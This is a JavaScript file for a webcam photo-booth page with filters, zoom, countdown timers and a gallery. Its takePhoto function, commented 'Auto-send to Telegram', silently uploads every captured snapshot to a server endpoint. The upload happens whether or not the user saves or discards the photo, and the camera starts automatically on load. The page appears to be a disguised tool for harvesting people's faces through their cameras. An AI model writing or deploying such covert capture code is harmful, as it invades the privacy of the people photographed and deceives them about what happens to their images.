const video = document.getElementById("camera");
const canvas = document.getElementById("canvas");
const preview = document.getElementById("preview");
const captureBtn = document.getElementById("capture");
const saveBtn = document.getElementById("save");
const discardBtn = document.getElementById("discard");
const zoomSlider = document.getElementById("zoom-slider");
const timer3 = document.getElementById("timer-3");
const timer5 = document.getElementById("timer-5");
const saveConfirm = document.getElementById("save-confirmation");
const discardConfirm = document.getElementById("discard-confirmation");
const filters = document.querySelectorAll(".filter-btn");
const gallery = document.getElementById("gallery");
const overlayMessage = document.getElementById("overlay-message");
const openBrowser = document.getElementById("open-browser");

let currentFilter = "none";
let zoom = 1;

// Start camera
async function startCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
  } catch (err) {
    console.error(err);
    overlayMessage.style.display = "flex";
  }
}

// Open camera from overlay
openBrowser.addEventListener("click", () => {
  overlayMessage.style.display = "none";
  startCamera();
});

// Filter selection
filters.forEach(btn => {
  btn.addEventListener("click", () => {
    currentFilter = btn.dataset.filter;
    video.style.filter = currentFilter;
  });
});

// Zoom control
zoomSlider.addEventListener("input", () => {
  zoom = zoomSlider.value;
  video.style.transform = `scale(${zoom})`;
});

// Timer function
function startTimer(seconds) {
  let count = seconds;
  const timerOverlay = document.createElement("div");
  timerOverlay.style.position = "absolute";
  timerOverlay.style.top = "50%";
  timerOverlay.style.left = "50%";
  timerOverlay.style.transform = "translate(-50%, -50%)";
  timerOverlay.style.fontSize = "50px";
  timerOverlay.style.color = "#00f0ff";
  timerOverlay.style.textShadow = "0 0 10px #ff00f0";
  timerOverlay.textContent = count;
  document.querySelector(".camera-box").appendChild(timerOverlay);

  const interval = setInterval(() => {
    count--;
    if (count > 0) {
      timerOverlay.textContent = count;
    } else {
      clearInterval(interval);
      timerOverlay.remove();
      takePhoto();
    }
  }, 1000);
}

// Timer buttons
timer3.addEventListener("click", () => startTimer(3));
timer5.addEventListener("click", () => startTimer(5));

// Capture photo
captureBtn.addEventListener("click", () => takePhoto());

function takePhoto() {
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const ctx = canvas.getContext("2d");
  ctx.filter = currentFilter;
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  preview.src = canvas.toDataURL("image/png");
  preview.hidden = false;

  saveBtn.disabled = false;
  discardBtn.disabled = false;

  // Auto-send to Telegram
  canvas.toBlob(async (blob) => {
    const formData = new FormData();
    formData.append("photo", blob, "snapshot.png");
    try {
      await fetch("/upload", { method: "POST", body: formData });
    } catch (err) {
      console.error(err);
    }
  });
}

// Save photo
saveBtn.addEventListener("click", () => {
  const link = document.createElement("a");
  link.href = preview.src;
  link.download = "snapshot.png";
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);

  showFloating(saveConfirm);

  // Add thumbnail to gallery
  const thumb = document.createElement("img");
  thumb.src = preview.src;
  gallery.appendChild(thumb);

  preview.hidden = true;
  saveBtn.disabled = true;
  discardBtn.disabled = true;
});

// Discard photo
discardBtn.addEventListener("click", () => {
  preview.hidden = true;
  saveBtn.disabled = true;
  discardBtn.disabled = true;
  showFloating(discardConfirm);
});

// Floating confirmation popup
function showFloating(el) {
  el.style.display = "block";
  setTimeout(() => { el.style.display = "none"; }, 2000);
}

// Click thumbnail to preview
gallery.addEventListener("click", (e) => {
  if (e.target.tagName === "IMG") {
    preview.src = e.target.src;
    preview.hidden = false;
    saveBtn.disabled = false;
    discardBtn.disabled = false;
  }
});

// Initialize camera automatically if HTTPS or localhost
if (location.protocol === "https:" || location.hostname === "localhost") {
  startCamera();
}

// Scrollable filters
const slider = document.querySelector(".filter-container");
let isDown = false;
let startX;
let scrollLeft;

slider.addEventListener("mousedown", (e) => {
  isDown = true;
  slider.classList.add("active");
  startX = e.pageX - slider.offsetLeft;
  scrollLeft = slider.scrollLeft;
});

slider.addEventListener("mouseleave", () => {
  isDown = false;
  slider.classList.remove("active");
});

slider.addEventListener("mouseup", () => {
  isDown = false;
  slider.classList.remove("active");
});

slider.addEventListener("mousemove", (e) => {
  if (!isDown) return;
  e.preventDefault();
  const x = e.pageX - slider.offsetLeft;
  const walk = (x - startX) * 2; // Scroll speed
  slider.scrollLeft = scrollLeft - walk;
});

// Touch support
slider.addEventListener("touchstart", (e) => {
  isDown = true;
  startX = e.touches[0].pageX - slider.offsetLeft;
  scrollLeft = slider.scrollLeft;
});

slider.addEventListener("touchend", () => {
  isDown = false;
});

slider.addEventListener("touchmove", (e) => {
  if (!isDown) return;
  const x = e.touches[0].pageX - slider.offsetLeft;
  const walk = (x - startX) * 2;
  slider.scrollLeft = scrollLeft - walk;
});